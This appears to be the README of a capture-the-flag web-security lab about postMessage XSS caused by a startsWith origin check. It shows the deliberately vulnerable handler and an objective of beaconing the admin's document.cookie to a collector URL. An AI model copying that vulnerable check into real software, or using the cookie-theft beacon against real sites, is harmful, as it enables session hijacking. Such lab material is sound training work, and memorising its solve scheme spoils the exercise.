# postMessage XSS via startsWith Origin Check

> Track: `xss` · Difficulty: **practitioner** · ~40 min · Free hints.

## Scenario

**ChatCo Support** embeds a chat widget in an `<iframe>` and receives messages
from it with `window.postMessage`. Its message handler trusts the sender by
checking the **origin**:

```js
window.addEventListener('message', function (e) {
  if (e.origin.startsWith('http://widget-host')) {
    document.getElementById('slot').innerHTML = e.data; // sink
  }
});
```

The intent is "only accept messages from our widget origin." But `startsWith` has
**no delimiter**: any origin whose host merely _begins with_ `widget-host` passes —
`http://widget-host-evil:8080`, `http://widget-hostxyz:8080`, and so on.

The host page also lets the embedded widget URL be chosen with a `?widget=`
parameter (the value is **HTML-escaped** into the `src`, so you cannot break out of
the attribute — the origin check is the only way in).

The admin bot logs in (`/internal/bot-login`) and visits any path you queue via
`POST /report`, carrying its **non-HttpOnly** `session` cookie.

## Objective

Serve — or point the widget at — a frame on a **look-alike origin** that
`postMessage`s an HTML payload up to ChatCo's handler. Because the handler runs in
ChatCo's own **top-level, authenticated** page and writes your data with
`innerHTML`, an `<img onerror>` executes there with the admin's cookie in scope.
Beacon it to the collector:

```
http://collector:9000/report?c=<document.cookie>
```

Read it back via `GET /oob/received`, then:

```
POST /solve   {"c":"<32 hex>"}
```

`/solve` returns `FLAG{<64 hex>}` when it matches the admin session.

## Getting Started

1. View source. The page embeds an iframe (its URL comes from `?widget=`) and adds
   a `message` listener. What does the listener do with `e.data`, and how does it
   decide whether to trust the sender?
2. The origin check is `startsWith('http://widget-host')`. What hostnames satisfy
   that besides the real `widget-host`? The lab resolves a look-alike,
   `widget-host-evil`, on its network.
3. Point `?widget=` at a frame on the look-alike origin that messages your payload
   to its parent. The handler will `innerHTML` it into the **top-level** ChatCo
   page — where the admin cookie lives (a cross-site _iframe_ would not have it, so
   the top-level landing is what makes this work).

**CWE-79 / CWE-346 (Origin Validation Error). OWASP A03:2021 – Injection.** The fix
— exact-match the origin against an allowlist and never `innerHTML` message data —
is in `SOLUTION.md`.

## Note on the stack

The catalogued scenario ships a wildcard-DNS resolver and a second nginx vhost so
an attacker can register a look-alike hostname. This lab reproduces the same
condition with **docker network aliases**: one stdlib widget service answers to
both `widget-host` (legit) and `widget-host-evil` (look-alike), and the Flask host
page provides the `?widget=` embed point. See `SOLUTION.md` for the deviation note
and why the sink is delivered to the top-level page rather than a framed target.
